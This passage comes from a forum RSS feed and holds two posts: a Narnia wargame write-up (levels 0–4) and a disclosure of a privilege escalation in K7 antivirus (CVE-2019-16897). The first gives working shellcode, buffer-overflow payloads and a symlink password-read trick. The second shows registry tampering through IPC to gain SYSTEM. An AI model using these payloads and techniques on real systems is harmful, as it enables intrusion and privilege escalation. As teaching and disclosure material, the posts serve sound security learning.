<p>Each pwnable consists of a SetUID binary (this means on runtime it will execute as another user, so if we can make the binary spawn a shell while it is running, the shell will be as another user), and the .c sourcecode, so we can get an idea of how each challenge is made up (in this writeup I have anotated the source codes to help clarify what is happening).</p>
<p>I found that being able to visualize how the stack is structured helped me massively to understand what is happening in this attack. Here is a perfect video from Computerphile (<a href="https://youtube.com/computerphile" rel="nofollow noopener">https://youtube.com/computerphile</a>) that elaborates upon what the attack consists of, and how it works <a href="https://www.youtube.com/watch?v=1S0aBV-Waeo" rel="nofollow noopener">https://www.youtube.com/watch?v=1S0aBV-Waeo</a>.</p>
<h1>Challenge 0</h1>
<p>Our first step is to login to the first user on SSH, using the credentials narnia0:narnia0, on port 2226.<br>
<code>ssh narnia0@narnia.labs.overthewire.org -p 2226</code><br>
Now we head to the /narnia/ directory and find the source code and binary, here is the source code:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main(){
    long val=0x41414141;  /*Puts the value we want to overwrite on the stack*/
    char buf[20];         /*Sets the buffer length to 20 bytes*/

    printf("Correct val's value from 0x41414141 -&gt; 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&amp;buf); /*Reads input into buffer (24 char limit on buffer, which is enough to fill the buffer and then the 4 bytes for deadbeef)*/

    printf("buf: %s\n",buf); /*Prints contents of buffer*/
    printf("val: 0x%08x\n",val); /*Outputs value we want to overwrite*/

    if(val==0xdeadbeef){ /*If value == 0xdeadbeef*/
        setreuid(geteuid(),geteuid()); /*Make the binary use the SUID and GUID*/
        system("/bin/sh"); /*Run /bin/sh to spawn a shell*/
    }
    else { /*If the value isn't 0xdeadbeef then*/
        printf("WAY OFF!!!!\n"); /*Print "WAY OFF!!!!" and then exit*/
        exit(1);
    }

    return 0;
}
</code></pre>
<p>So this challenge is extremely straight forward, essentially, we can right to the buffer, which is of size 20, and since there are no limits on how much we can input into the buffer, it allows us to write more than twenty characters to memory, and since the “val” variable is the next value on the stack, we can overwrite it’s contents.</p>
<p>We can do this two ways, the clean way, and the disgusting way:</p>
<p>The clean way would be make python print twenty A’s (the buffer size), plus the value we want to put in memory, which in this case needs to be in little endian format.</p>
<p>We know it needs to be little endian format since when we run “file /narnia/narnia0”, we get the following output:<br>
<code>narnia0: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0840ec7ce39e76ebcecabacb3dffb455cfa401e9, not stripped</code> (<a href="https://en.wikipedia.org/wiki/Endianness" rel="nofollow noopener">https://en.wikipedia.org/wiki/Endianness</a>)</p>
<p>To convert a value to little endian (in this case we want to convert 0xdeadbeef), so we remove the 0x (this is just an indicator that the value is hex), then we split it up into groups of two (de ad be ef), now we reverse the order of the groups, but not the characters (ef be ad de), and finally we add “\x” in front of each group, and put them all together: <code>\xef\xbe\xad\xde</code>, so that’s what we need to feed the binary after the 20 bytes, let’s try it.</p>
<pre><code class="lang-auto">narnia0@narnia:/narnia$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | ./narnia0
Correct val's value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
                                               val: 0xdeadbeef
</code></pre>
<p>So the challenge bugs out, and doesn’t open a shell, but it does show us that the correct value is in place, now we can use a little trick involving cat to keep the i/o stream open:</p>
<pre><code class="lang-auto">narnia0@narnia:/narnia$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"';cat) | ./narnia0
Correct val's value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
                                               val: 0xdeadbeef
whoami
narnia1
</code></pre>
<p>Voila! Challenge 0 has been pwned, now we have a shell as narnia1, and can simply cat the password for narnia1 from /etc/narnia_pass/narnia1.</p>
<h1>Challenge 1</h1>
<p>The next challenge makes things a bit more complicated, we are now given the following source code:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){ /*If the "EGG" env var is empty then*/
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1); /*And then exit*/
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG"); /*Assign the contents of EGG to a var called ret*/
    ret(); /*Execute ret*/

    return 0;
}
</code></pre>
<p>Since this binary runs the contents of ret, we can feed ret shell code and it will be executed.</p>
<p>As an example, I will be using a purely alphanumeric shellcode made by a friend of mine (<a href="https://github.com/push4d/Shellcode-alfanumerico---Spawn-bin-sh-elf-x86-" rel="nofollow noopener">https://github.com/push4d/Shellcode-alfanumerico---Spawn-bin-sh-elf-x86-</a>), so we can put the shellcode inside the environment variable called “EGG” and then run the binary.</p>
<pre><code class="lang-auto">narnia1@narnia:/narnia$ export EGG=hzzzzYAAAAAA0HM0hN0HNhu12ZX5ZBZZPhu834X5ZZZZPTYhjaaaX5aaaaP5aaaa5jaaaPPQTUVWaMz
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
</code></pre>
<p>Just to expand upon this, the shellcode does not have to be alphanumeric, it just makes it easier if it is since you can directly put it into the env var. An example of a payload that uses non-alphanumeric shellcode would be the following:</p>
<pre><code class="lang-auto">narnia1@narnia:/narnia$ export EGG=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'); /narnia/narnia1
Trying to execute EGG!
$ whoami
narnia2
</code></pre>
<h1>Challenge 2</h1>
<p>Now we get into some “actual” binexp, with an extremely basic payload that fills ESP with nops (\x90), except for some shell code at the end, and then overwriting the ret address to be the start of ESP.</p>
<p>Here is the source code:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

int main(int argc, char * argv[]){
    char buf[128]; /*Declares the buffer length to be 128 bytes*/

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]); /*Display usage*/
        exit(1);
    }
    strcpy(buf,argv[1]); /*Copy contents of arg 1 to buffer*/
    printf("%s", buf); /*Print the buffer*/

    return 0;
}
</code></pre>
<p>So we can start by getting the crash offset (which will be somewhere around 128, since this is the buffer size, although if there is something between the end of the buffer and the start of the ret address on the stack, then we will need to play with the ret addr location in the payload), for this I made a really simple bash loop that slowly increases the padding.</p>
<pre><code class="lang-bash">for i in $(seq 1 300); do echo $i; ./narnia2 $(python -c 'print "A"*'$i';'); done
</code></pre>
<p>All this does is loops from 1 to 300, and echoes out the number each time, but also prints “A” that amount of times while passing it as an argument to the binary, so we can follow the numbers until we find a segfault.</p>
<pre><code class="lang-auto">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA132
Segmentation fault
</code></pre>
<p>We can see that after 132 the binary segfaults, so that is our space we have till the ret address starts getting overwritten.</p>
<p>Now, the buffer is 128 bytes, and the ret address breaks at 132, so between the end of the buffer, and the start of the return address there are 4 bytes of “junk”, which you can just fill with nopsleds, but in our case we will just repeat the ret address 4 times (one will fall into the right position, the others are fillers).</p>
<p>So we have our padding, to get our return address, we can simply crash it with a segfault, while watching it with ltrace.</p>
<pre><code class="lang-auto">narnia2@narnia:/narnia$ ltrace ./narnia2 $(python -c 'print "A"*132')
__libc_start_main(0x804844b, 2, 0xffffd704, 0x80484a0 &lt;unfinished ...&gt;
strcpy(0xffffd5e8, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                                     = 0xffffd5e8
printf("%s", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                                           = 132
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
</code></pre>
<p>Ltrace shows us that strcpy tries to copy our "A"s to the address <code>0xffffd5e8</code> (the memory location of the buffer), which in little endian is: <code>\xe8\xd5\xff\xff</code>. So we have the padding, we have the return address, now we just need the shellcode. For this we can use the example alphanumeric shellcode, or we can find our own with a simple google search for “32 bit bin sh shellcode” (<a href="http://shell-storm.org/shellcode/files/shellcode-827.php" rel="nofollow noopener">http://shell-storm.org/shellcode/files/shellcode-827.php</a>).</p>
<p>So now to structure our payload, the idea is to take advantage of the fact that we control the contents of the buffer, and we also control the return address, so if we make the contents of the buffer malicious, and then return back to the start of the buffer, it will be executed.</p>
<p>So the first step is having our padding, a nop (no operation, \x90), basically makes the machine do nothing, and move on to the next instruction, so we can fill the start of the buffer with nops, up until our shellcode.</p>
<p>The shellcode takes up a total of 28 bytes, and our buffer size is 128 bytes, so that is 100 nops (128 - 28), then we have the 4 bytes of “junk”, and then the return address, to summarise:<br>
<code>\x90 x 100 + 28 (shellcode) + 4 (junk) + 4 (ret addr)</code></p>
<p>So, now we know how to build our payload, and can run it on the vulnerable binary:</p>
<pre><code class="lang-auto">narnia2@narnia:/narnia$ ./narnia2 $(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90\x90\x90\x90" + "\xe8\xd5\xff\xff"')
$ whoami
narnia3
</code></pre>
<h1>Challenge 3</h1>
<p>For challenge three, things start to take a turn for the better, everything is a little more complex. Not in the way that the concepts are more complex, but a bit of out-of-the-box thinking is required to make the vulnerability work in your advantage.</p>
<p>We start with the following source code:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null"; /*Sets the output file to /dev/null (var size is 16 bytes)*/
    char ifile[32]; /*Sets the variable size to 32 bytes*/
    char buf[32]; /*Sets the buffer size to 32 bytes*/

    if(argc != 2){ /*Print usage*/
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]); /*Copies arg to ifile var (this is vulnerable)*/
    if((ofd = open(ofile,O_RDWR)) &lt; 0 ){
        printf("error opening %s\n", ofile); /*Error handler*/
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) &lt; 0 ){
        printf("error opening %s\n", ifile); /*Error handler*/
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1); /*Read content of In File*/
    write(ofd,buf, sizeof(buf)-1); /*Write content to Out File*/
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd); /*Close both*/
    close(ofd);

    exit(1);
}
</code></pre>
<p>So, the base concept is that we can overwrite the output file to be something we can read, and we control the input file, the rest is pretty simple.</p>
<p>Here is an example of the binaries usage:</p>
<pre><code class="lang-auto">narnia3@narnia:/narnia$ touch /tmp/LetsPlay
narnia3@narnia:/narnia$ ./narnia3 /tmp/LetsPlay
copied contents of /tmp/LetsPlay to a safer place... (/dev/null)
</code></pre>
<p>We move to the /tmp directory since we control everything inside of it, now we need can start playing with the input file, we know the input buffer is 32 bytes, and the output file is 16 bytes, so we could technically make something like <code>/tmp/"z"*27</code>(32-len(’/tmp/’)), and then the file we want to write to, let’s say the output file is /tmp/outforchiv.</p>
<p>When you overflow the input variable, you also overwrite the null-byte that defines where that variable’s string ends, whereas the memory location where the outfile var starts remains the same, we can abuse this, and make the file be something like /tmp/27bytes/tmp/file, and then symlink narnia4’s password to /tmp/27bytes/tmp/file, but also make a file called /tmp/file with 777 permissions.</p>
<p>When we feed the binary this path, it will overflow the buffer, overwrite the termination byte, so the input file is taken as /tmp/27bytes/tmp/file, but the output file is just /tmp/file.</p>
<p>Let’s put this theory to test:</p>
<pre><code class="lang-auto">narnia3@narnia:/tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp$ ln -s /etc/narnia_pass/narnia4 outforchiv
narnia3@narnia:/tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp$ touch /tmp/outforchiv
narnia3@narnia:/tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp$ chmod 777 /tmp/outforchiv
narnia3@narnia:/tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp$ /narnia/narnia3 $(pwd)/outforchiv
copied contents of /tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp/outforchiv to a safer place... (/tmp/outforchiv)
narnia3@narnia:/tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp$
</code></pre>
<p>Now we can cat the /tmp/outforchiv file and read the password!</p>
<h1>Challenge 4</h1>
<p>Welcome to the final challenge of this writeup, it is another buffer overflow to pop a shell, so I recommend you go back and make sure you understand the basics with challenge 2.</p>
<p>We have the following source code:</p>
<pre><code class="lang-auto">#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;ctype.h&gt;

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256]; /*Defines the buffer length*/

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc&gt;1)
        strcpy(buffer,argv[1]); /*Copies the argument to the buffer (vulnerable)*/

    return 0;
}
</code></pre>
<p>We can start by getting our padding, we know the buffer size is 256, so we can start with that, next we need our return address, so we can run: <code>ltrace ./narnia4 $(python -c 'print "A"*300')</code> and then get the address that strcpy was going to copy the A’s to (in my case it was 0xffffd4d4), so we have our padding, return address, and we can re-use the shellcode from challenge 2, which is 28 bytes long.</p>
<p>Our payload will look something like this right now:<br>
<code>./narnia4 $(python -c 'print "\x90"*256 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\ x80" + "\xd4\xd4\xff\xff"*4')</code></p>
<p>To clarify, I have converted the return address to little endian format (0xffffd4d4 -&gt; \xd4\xd4\xff\xff), and I have made it appear four times consecutively in the payload to increase chances of it falling into the right place, finally, I replaced the "A"s with \x90’s or no operation bytes, so the machine will skip those bytes until it reaches our shellcode.</p>
<p>This won’t work, since there is a 4 byte address between the end of the buffer and the start of the return address, so we need to add 4 bytes to our padding, making it 260.</p>
<p>Our final exploit being:</p>
<pre><code class="lang-bash">./narnia4 $(python -c 'print "\x90"*260 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\
x80" + "\xd4\xd4\xff\xff"*4') # YOUR RETURN ADDRESS MAY VARY
</code></pre>
<p>And when we run it:</p>
<pre><code class="lang-bash">narnia4@narnia:/narnia$ ./narnia4 $(python -c 'print "\x90"*(260 - 28) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\
x80" + "\xd4\xd4\xff\xff"*4')
$ whoami
narnia5
</code></pre>
<p>Bingo! I hope this writeup clarified some concepts, or helped someone start off with an idea of what is happening. If anyone has any questions, I am basically permanently reachable on both twitter (<a href="https://twitter.com/SecGus" rel="nofollow noopener">https://twitter.com/SecGus</a>), and on this platform, 0x00sec.</p>
<p>Some fun and useful resources for learning pwn are:</p>
<ul>
<li>OverTheWire Narnia (Where these challenges can be found,<a href="https://overthewire.org/wargames/narnia/" rel="nofollow noopener">https://overthewire.org/wargames/narnia/</a>)</li>
<li>Pwnable KR (<a href="http://pwnable.kr/" rel="nofollow noopener">http://pwnable.kr/</a>)</li>
<li>Root-Me (<a href="https://www.root-me.org/" rel="nofollow noopener">https://www.root-me.org/</a>)</li>
<li>HackTheBox (<a href="https://hackthebox.eu" rel="nofollow noopener">https://hackthebox.eu</a>)</li>
</ul>
            <p><small>3 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/overthewire-narnia-challenges-0-4-writeups-binary-exploitation-basics-with-explanations/18362">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/overthewire-narnia-challenges-0-4-writeups-binary-exploitation-basics-with-explanations/18362</link>
          <pubDate>Tue, 31 Dec 2019 02:38:05 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-18362</guid>
          <source url="https://0x00sec.org/t/overthewire-narnia-challenges-0-4-writeups-binary-exploitation-basics-with-explanations/18362.rss">OverTheWire Narnia challenges 0-4 Writeups (Binary exploitation basics with explanations)</source>
        </item>
        <item>
          <title>Anti-virus Exploitation: Local Privilege Escalation in K7 Security (CVE-2019-16897)</title>
          <dc:creator><![CDATA[dtm]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <h1>Anti-virus Exploitation</h1>
<p>Hey guys, long time no article! Over the past few months, I have been looking into exploitation of anti-viruses via logic bugs. I will briefly discuss the approach towards performing vulnerability research of these security products using the vulnerability I discovered in K7 Security as an example.</p>
<p><strong>Disclaimer</strong>: I do not claim to know everything about vulnerability research nor exploitation so if there are errors in this article, please let me know.</p>
<h2>Target Selection</h2>
<p>Security products such as anti-viruses are an attractive target (at least for me) because they operate in a trusted and privileged context in both the kernel, as a driver, and userland, as a privileged service. This means that they have the ability to facilitate potential escalation of privilege or otherwise access privileged functionality. They have a presence in the low-privileged space of the operating system. For example, there may exist a UI component with which the user can interact, sometimes allowing options to be changed such as enabling/disabling anti-virus, adding directory or file exclusions, and scanning files for malware. Anti-viruses must also access and perform operations on operating system objects to detect malware, such as reading files, registry keys, memory, etc. as well as being able to do privileged actions to keep the system in a protected state no matter the situation. It is between this trusted, high privilege space and the untrusted, low privileged space where interesting things occur.</p>
<h2>Attack Surface</h2>
<p>As aforementioned, anti-viruses live in both sides of the privilege boundary as shown in the following diagram:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Example anti-virus's interactions" data-orig-src="upload://faASbYw3C94QMzz1zYMDt9OXDH2.jpeg" width="690" height="363"><br>
Whatever crosses the line between high and low privilege represents the attack surface.</p>
<p>Let’s look at how this diagram can be interpreted. The user interface shares common operations with the service process which is expected. If the user wants to carry out a privileged action, the service will do it on its behalf, assuming that security checks are passed. If the user wishes to change a setting, they open the user interface and click a button. This is communicated to the service process via some form of inter-process communication (IPC) which will perform the necessary actions, e.g. the anti-virus stores its configuration in the registry and therefore, the service will open the relevant registry key and modify some data. Keep in mind that the registry key is stored in the <code>HKEY_LOCAL_MACHINE</code> hive which is in high privilege space, thus requiring a high privilege process to modify its data. So the user, from low privilege, is able to indirectly modify a high privilege object.</p>
<p>One more example. A user can scan for malware through the user interface (of course, what good is an anti-virus if they disallow the user from scanning for malware?). A simple, benign operation, what could go wrong? Since it is the responsibility of the service process to perform the malware scan, the interface communicates the information to the service process to target a file. It must interact with the file in order to perform the scan, i.e. it must locate the file on disk and read its content. If, while the file data has been read and is being scanned for malware, and the anti-virus does not lock the file on disk, it is possible for the malware to be replaced with a <a href="https://docs.microsoft.com/en-us/windows/win32/fileio/symbolic-links"><em>symbolic link</em> </a> pointing to a file in a high privileged directory (yes, it is possible), let’s use <code>notepad.exe</code>. When the scan is completed and has been determined to be malware, the service process can delete the file. However, the malware has been replaced with a link to <code>notepad.exe</code>! If the anti-virus does not detect and reject the symbolic link, it will delete <code>notepad.exe</code> without question. This is an example of a <a href="https://capec.mitre.org/data/definitions/29.html">Time of Check to Time of Use (TOCTOU)</a> race condition bug. Again, the user, from low privilege, is able to indirectly modify a high privilege object because of the service process acting as a broker.</p>
<hr>
<h1>Exploitation</h1>
<p>This vulnerability allows a low privilege user to modify (almost) arbitrary registry data through the anti-virus’s settings. However, a low privileged user (non administrator) <s>cannot</s> should not be able to change the anti-virus’s settings.</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Admin check" data-orig-src="upload://7cGBYbGu1G3V3NmC4K1rUm9VZlL.png" width="690" height="498"></p>
<h2>Bypassing Administrative Checks</h2>
<p>To narrow down how this administration check is performed, procmon can be used to identify operating system activity as the settings page is accessed again. This will trigger the anti-virus to recheck the administrative status of the current user while it interacts with the operating system as it is being logged.  Of course, since we are low privilege and procmon requires high privilege, it is not practical in a real environment. However, because we control the testing environment, we can allow procmon to run as we have access to an administrator account. Setting promon to filter by <code>K7TSMain</code> as the process name will capture activity performed by the user interface process.</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="procmon%20filter" data-orig-src="upload://ge7qbKRm4zeOTQKg4b9FcWkEgV4.png" width="515" height="324"><br>
When procmon starts to log, attempting to access the settings page again in the UI will trigger procmon to instantly show results:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="procmon%20admin%20check" data-orig-src="upload://3FVoz24HFvGvqVwltZlKZWGWN4d.png" width="690" height="291"><br>
It can be seen that the anti-virus stores the administrative check in the registry in <code>AdminNonAdminIsValid</code>. Looking at the value in the Event Properties window shows that it returned <code>0</code>, meaning that non administrator users are not allowed. But there is a <em>slight</em> problem here. Bonus points if you can spot it.</p>
<p>Now that we know where the check is being performed, the next step is bypassing it. procmon shows that the process is running in low privilege space as indicated by the user and the medium integrity meaning that we own the process. If it is not protected, we can simply hook the <code>RegQueryValue</code> function and modify the return value.</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Attaching%20to%20K7TSMain" data-orig-src="upload://8fauZJXj4k9F36pypVxeIUTyYfn.png" width="690" height="306"><br>
Attempting to attach to the <code>K7TSMain.exe</code> process using x32dbg is allowed! The breakpoint on <code>RegQueryValueExA</code> has been set for when we try to access the settings page again.</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Triggering%20RegQueryValueExA%20breakpoint" data-orig-src="upload://6qXGexr4vnH7LnCNzvsKhdCbk3G.png" width="690" height="374"><br>
x32dbg catches the breakpoint when the settings page is clicked. The value name being queried is <code>ProductType</code> but we want <code>AdminNonAdminIsValid</code>, so continuing on will trigger the next breakpoint:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Breakpoint%20on%20AdminNonAdminIsValid" data-orig-src="upload://fgI1VMCEi7vX8FfU9huJ9MGJHj2.png" width="690" height="458"><br>
Now we can see <code>AdminNonAdminIsValid</code>. To modify the return value, we can allow the function to run until return. However, the calling function looks like a wrapper for <code>RegQueryValueExA</code>:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="RegQueryValueExA%20wrapper%20function" data-orig-src="upload://bl8AlxwDRrAFAZImnhpjnWIoIeW.png" width="541" height="187"><br>
So continuing again until return reveals the culprit function that performs the check:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Admin%20check%20function" data-orig-src="upload://5tjkjvy7WKnqKb3S42Ra36s3RP2.png" width="690" height="143"><br>
There is an obvious check there for the value <code>1</code> however, the current returned value for the registry data is <code>0</code>. This decides the return value of this function so we can either change <code>[esp+4]</code> or change the return value to bypass the check:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Bypass%20admin%20check" data-orig-src="upload://hP3hxjMXiaAnmntIL4rYW4ttks8.png" width="690" height="421"></p>
<h2>Intercepting Inter-process Communication</h2>
<p>Multiple <a href="https://docs.microsoft.com/en-us/windows/win32/ipc/interprocess-communications">inter-process communication methods</a> are available on Windows such as mailslots, file mapping, COM, and named pipes. We must figure out which is implemented in the product to be able to analyse the protocol. An easy way to do this is by using API Monitor to log select function calls made by the process. When we do this and then apply a changed setting, we can see references to named pipe functions:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="API Monitor" data-orig-src="upload://92rBa2ozIBxYX4Gd60o4OMQlkYs.png" width="690" height="327"><br>
Note that the calling module is <code>K7AVOptn.dll</code> instead of <code>K7TSMain.exe</code>. If we have a look at the data being communicated through <code>TransactNamedPipe</code>, we can see some interesting information:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Extension names" data-orig-src="upload://Aqg4uDpnt2mmRwJZpfKYclAj63Z.png" width="690" height="199"><br>
The first thing that pops out is that it looks like a list of extension names (<code>.ocx</code>, <code>.exe</code>, <code>.com</code>) separated with <code>|</code> where some have wildcard matching. This could be a list of extensions to scan for malware. If we have a look at the registry where the anti-virus stores its configuration, we can see something similar under the value <code>ScanExtensions</code> in the <code>RTFileScanner</code> key:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="image" data-orig-src="upload://ciUr1asLYvN6Uw716jTaJvlZTxK.png" width="589" height="499"><br>
Continuing down the list of calls, one of them contains some very intriguing data:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="image" data-orig-src="upload://hqDuUSlC8aNrL2dtJQxJ27AwNlV.png" width="690" height="407"><br>
It looks as though the anti-virus is applying values by specifying (privileged) registry keys and their values by their full key path. The next obvious step is to see if changing one of the keys and their values will work. This can be done by breakpointing on the <code>TransactNamedPipe</code> function in x32dbg:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="TransactNamedPipe" data-orig-src="upload://v7CF3qslcDS6gsZB0a556giScqY.png" width="690" height="495"><br>
Once here, locate the input buffer in the second argument and alter the data to add or change a key in the <code>HKEY_LOCAL_MACHINE</code> hive like so:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Changing registry keys and values" data-orig-src="upload://aF9Zpbz6dsMVjzrNyQJgWRRLObA.png" width="690" height="151"><br>
If it is possible to change this registry key’s values, high privileged processes will be forced to load the DLLs listed in <code>AppInit_DLLs</code>, i.e. one that we control. The <code>LoadAppInit_DLLs</code> value must also be set to <code>1</code> (it is <code>0</code> by default) to enable this functionality. The result:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Modified registry values" data-orig-src="upload://bTf9fhQyS2zrD9mm4tmRLZT4ayc.png" width="690" height="382"></p>
<h2>Triggering the Payload</h2>
<p>You may have noticed that the registry key resides within <code>Wow6432Node</code> which is the 32-bit counterpart of the registry. This is because the product is 32-bit and so Windows will automatically redirect registry changes. In 64-bit Windows, processes are usually 64-bit and so the chances of loading the payload DLL through <code>AppInit_DLLs</code> is unlikely. A reliable way is to make use of the anti-virus because it is 32-bit assuming a privileged component can be launched. The easiest way to do this is to restart the machine because it will reload all of the anti-virus’s processes however, it is not always practical nor is it clean. Clicking around the UI reveals that the update function runs <code>K7TSHlpr.exe</code> under the <code>NT AUTHORITY\SYSTEM</code> user:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="K7TSHlpr update" data-orig-src="upload://2fJrD136ohpjBN1xl8ydPsecwUH.png" width="690" height="220"></p>
<p>As it is a 32-bit application, Windows will load our <code>AppInit_DLLs</code> DLL into the process space.</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="image" data-orig-src="upload://c1NuOJytpk5luJrUgjmPTG3on0c.png" width="690" height="432"><br>
Using <code>system("cmd")</code> as the payload will prompt the user with an interactive session in the context of the <code>NT AUTHORITY\SYSTEM</code> account via the <code>UI0Detect</code> service:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="UI0Detect" data-orig-src="upload://j3frEI9S5piT29B6tvNq7bLQxmz.png" width="468" height="291"><br>
Selecting to view the message brings up the following:</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="Interactive session" data-orig-src="upload://by4zLKwXQR08nbycpSnLTkjvYld.png" width="620" height="500"><br>
We have root! <img src="https://0x00sec.org/images/emoji/twitter/sunglasses.png?v=9" title=":sunglasses:" class="emoji" alt=":sunglasses:"></p>
<h2>Automated Exploit</h2>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/1/1899bac9059d7f4f63ded7774d9d9ecb86f6e253.gif" data-download-href="/uploads/short-url/3vCP3xZHcnFFLWDyzvcVQusGzvl.gif?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/1/1899bac9059d7f4f63ded7774d9d9ecb86f6e253_2_690x395.gif" alt="" data-base62-sha1="3vCP3xZHcnFFLWDyzvcVQusGzvl" width="690" height="395" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/1/1899bac9059d7f4f63ded7774d9d9ecb86f6e253_2_690x395.gif, https://0x00sec.s3.amazonaws.com/optimized/2X/1/1899bac9059d7f4f63ded7774d9d9ecb86f6e253_2_1035x592.gif 1.5x, /uploads/default/original/2X/1/1899bac9059d7f4f63ded7774d9d9ecb86f6e253.gif 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/1/1899bac9059d7f4f63ded7774d9d9ecb86f6e253_2_10x10.png"></a></div><p></p>
<hr>
<p><a href="https://github.com/NtRaiseHardError/Antimalware-Research/tree/master/K7%20Security/Local%20Privilege%20Escalation/v16.0.0120">Link to my GitHub for the advisory and an automated exploit</a>.</p>
            <p><small>5 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/anti-virus-exploitation-local-privilege-escalation-in-k7-security-cve-2019-16897/17655">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/anti-virus-exploitation-local-privilege-escalation-in-k7-security-cve-2019-16897/17655</link>
          <pubDate>Sun, 24 Nov 2019 13:08:01 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-17655</guid>
